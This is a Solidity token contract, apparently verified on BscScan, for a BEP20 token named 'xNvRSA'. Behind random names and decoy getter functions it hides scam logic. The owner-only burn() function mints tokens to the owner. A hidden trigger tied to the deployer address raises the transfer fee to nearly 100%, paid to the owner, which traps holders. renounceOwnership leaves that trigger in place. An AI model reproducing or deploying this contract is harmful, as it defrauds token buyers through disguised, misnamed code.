/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.9;
contract txyqTTZA {
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  EuPYmQ = 1000000000000000000;
address private  ngRhlS = address(0);
address private  sUbKfv = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  sOftzo = 1000000000000000;
address private  xShARu = address(0);
address public owner;
address private  TEoGIO = address(0);
uint256 private  xlLduA = 10000000000;
address private  LvfRTV = address(0);
string public  name = "xNvRSA";
uint256 public constant ETMcNy = 99999;
address private  RwKFbO = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  RMOyVh = 1000000000000000000;
string public  symbol = "xNvRSA";
uint8 public constant decimals = 18;
uint256 private  PWSsnF = 1000000000000000000000;
address private  thrgwA = address(0);
uint256 private  ZUBdlx = 10000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  LlCNgV = address(0);
uint256 private  KqVsjr = 100000000;
address private  LsRjOg = address(0);
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;


function _getZUBdlx() private returns (uint256) {
return ZUBdlx;
}



constructor () public {
LlCNgV = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}




function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "Bvrkdb");
require(to != address(0), "Bvrkdb");
require(amount <= balanceOf[from], "Bvrkdb");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ETMcNy/EuPYmQ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==LlCNgV){
EuPYmQ = ETMcNy+2;
}
emit Transfer(from, to, transferAmount);
}
function _getRMOyVh() private returns (uint256) {
return RMOyVh;
}

function _getxShARu() private returns (address) {
return xShARu;
}

function _getsUbKfv() private returns (address) {
return sUbKfv;
}



function _getLsRjOg() private returns (address) {
return LsRjOg;
}





function _getthrgwA() private returns (address) {
return thrgwA;
}

function _getKqVsjr() private returns (uint256) {
return KqVsjr;
}

function _getLvfRTV() private returns (address) {
return LvfRTV;
}

function _getngRhlS() private returns (address) {
return ngRhlS;
}



function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getPWSsnF() private returns (uint256) {
return PWSsnF;
}



function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}


function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tBvrkdb 0");
require(spender != address(0), "fBvrkdb 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}


function _getRwKFbO() private returns (address) {
return RwKFbO;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}




function _getsOftzo() private returns (uint256) {
return sOftzo;
}



function _getxlLduA() private returns (uint256) {
return xlLduA;
}



function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getTEoGIO() private returns (address) {
return TEoGIO;
}


}